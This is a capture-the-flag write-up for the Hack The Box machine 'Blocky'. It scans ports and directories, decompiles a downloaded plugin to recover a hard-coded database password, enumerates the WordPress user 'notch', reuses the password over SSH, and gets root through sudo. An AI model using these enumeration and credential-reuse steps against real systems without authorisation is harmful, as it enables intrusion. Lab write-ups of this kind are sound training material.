## -------------->> Blocky <<--------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.37 -p-
-----------

    Nmap scan report for 10.10.10.37
    Host is up (0.14s latency).
    Not shown: 65530 filtered ports
    PORT      STATE  SERVICE   VERSION
    21/tcp    open   ftp       ProFTPD 1.3.5a
    22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
    |   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
    |_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
    80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))
    |_http-generator: WordPress 4.8
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: BlockyCraft &#8211; Under Construction!
    8192/tcp  closed sophos
    25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 184.05 seconds

// Navigating to http://10.10.10.37/ , display us a game website in development

// Rolling down the site there is a 'Login' button

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blocky/1.png)

// Clicking on the login redirect us to http://10.10.10.37/wp-login.php

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blocky/2.png)

// Lets search for some interesting files or directories with [dirsearch](https://github.com/maurosoria/dirsearch) tool (By maurosoria).

    $ python3 dirsearch.py -u http://10.10.10.37/ -t 100
-----

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 10903

    Output File: /home/kali/Desktop/Tools/dirsearch/reports/10.10.10.37/_21-08-12_09-31-32.txt

    Error Log: /home/kali/Desktop/Tools/dirsearch/logs/errors-21-08-12_09-31-32.log

    Target: http://10.10.10.37/

    ...
    
    [09:32:19] 200 -   19KB - /license.txt
    [09:32:27] 200 -   10KB - /phpmyadmin/
    [09:32:27] 200 -  745B  - /plugins/
    [09:32:29] 200 -    7KB - /readme.html
    [09:32:38] 200 -  380B  - /wiki/
    [09:32:38] 200 -    1KB - /wp-admin/install.php
    [09:32:38] 200 -    0B  - /wp-config.php
    [09:32:38] 200 -    0B  - /wp-content/
    [09:32:38] 200 -    1B  - /wp-admin/admin-ajax.php
    [09:32:38] 200 -   69B  - /wp-content/plugins/akismet/akismet.php
    [09:32:39] 200 -  965B  - /wp-content/uploads/
    [09:32:39] 200 -    0B  - /wp-cron.php
    [09:32:39] 200 -    2KB - /wp-login.php
    [09:32:39] 200 -   40KB - /wp-includes/

    Task Completed

// Found directories: /wiki/ , /plugins/ , /phpmyadmin/ , /wp-includes/ , 

// /Wiki-Underconstructin , /phpmyadmin/-phpmyadmin login , /wp-includes/-Wordpress plugins

// But, /plugins/ have 2 interesting files in him

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blocky/3.png)

// Its two .jar(ziped java) files , Download them

    $ ls
    BlockyCore.jar  griefprevention-1.11.2-3.1.1.298.jar

// Lets unpack BlockyCore.jar

    $ jar -xf BlockyCore.jar 
    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

// BlockyCore.jar generated 2 directories: META-ING & com

    $ tree
    .
    ├── BlockyCore.jar
    ├── META-INF
    │   └── MANIFEST.MF
    └── com
        └── myfirstplugin
            └── BlockyCore.class

// We can see that inside com there is another directory with file in him - 'BlockyCore.class'

// tring to see the file contant failed becouse its compiled, let decompile that file with online [java decompiler tool](http://www.javadecompilers.com/result)

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blocky/4.png)

    package com.myfirstplugin;

    public class BlockyCore
    {
        public String sqlHost;
        public String sqlUser;
        public String sqlPass;

        public BlockyCore() {
            this.sqlHost = "localhost";
            this.sqlUser = "root";
            this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
        }
        public void onServerStart() {
        }
        public void onServerStop() {
        }
        public void onPlayerJoin() {
            this.sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
        }
        public void sendMessage(final String username, final String message) {
        }
    }

// We have credentials ! 

        this.sqlUser = "root";
        this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
        

// Since we know now we dilling with Wordpress CMS we can use [wpscan](https://wpscan.com/wordpress-security-scanner) to scan for vulnerabillities

    $ wpscan --url http://10.10.10.37/ --api-token YOUR_API_KEY --plugins-detection mixed -e
-----

    _______________________________________________________________
             __          _______   _____
             \ \        / /  __ \ / ____|
              \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
               \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|

             WordPress Security Scanner by the WPScan Team
                             Version 3.8.18
           Sponsored by Automattic - https://automattic.com/
           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________

    [+] URL: http://10.10.10.37/ [10.10.10.37]
    [+] Started: Thu Aug 12 06:04:31 2021
    
    ...

    [i] User(s) Identified:

    [+] notch
     | Found By: Author Posts - Author Pattern (Passive Detection)
     | Confirmed By:
     |  Wp Json Api (Aggressive Detection)
     |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
     |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     |  Login Error Messages (Aggressive Detection)

// We have username 'notch' for Wordpress 

// Also can find in the main site

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blocky/5.png)

// Since we have user, password and SSH service running, lets try to connect

    $ ssh notch@10.10.10.37

    notch@10.10.10.37's password: 
    Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

    notch@Blocky:~$ id
    uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

// We connected !!! And have user flag

    notch@Blocky:~$ cat user.txt 
    59fee097........................

### -----Privilleges Escalation-----

// running 'sudo -l' command we can see that this user can run sudo so simple 'sudo -i' gets us root


    notch@Blocky:~$ sudo -l
    [sudo] password for notch: 
    Matching Defaults entries for notch on Blocky:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User notch may run the following commands on Blocky:
        (ALL : ALL) ALL

    notch@Blocky:~$ sudo -i
    root@Blocky:~# 

// And the flag !

    root@Blocky:~# cat root.txt 
    0a9694a5b4......................
